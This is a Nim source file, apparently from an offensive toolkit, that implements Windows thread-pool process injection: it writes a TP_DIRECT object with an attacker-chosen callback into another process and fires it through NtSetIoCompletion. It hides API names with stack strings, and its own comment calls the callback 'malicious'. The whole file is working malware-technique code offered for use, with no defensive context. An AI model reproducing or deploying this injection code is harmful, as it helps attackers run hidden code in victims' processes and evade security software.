import winim/lean

import nimpool
import ../instance
import ../utils/[stackstr]

proc injectViaTpDirect*(tProcess: HANDLE, pAddress: pointer, hIoPort: HANDLE): bool =
  var
    direct: TP_DIRECT
    remoteTpDirect: PVOID
    status: NTSTATUS
    sNtdll {.stackStringA.} = "NTDLL.DLL"
    sNtSetCompletion {.stackStringA.} = "NtSetIoCompletion"
  
  direct.Callback = pAddress

  # Allocate remote memory for the TP_DIRECT object
  remoteTpDirect = ninst.Win32.VirtualAllocEx(tProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpDirect == nil:
    return false

  if ninst.Win32.WriteProcessMemory(tProcess, remoteTpDirect, direct.addr, sizeof(TP_DIRECT), NULL) == 0:
    return false

  let pNtSetIoCompletion = cast[NtSetIoCompletion](
    ninst.Win32.GetProcAddress(ninst.Module.ntdll, LPCPTR(sNtSetCompletion))
  )
  if pNtSetIoCompletion == nil:
    return false

  # Trigger malicious callback
  status = pNtSetIoCompletion(hIoPort, remoteTpDirect, cast[PVOID](0), 0, 0)
  if not NT_SUCCESS(status):
    return false
  
  return true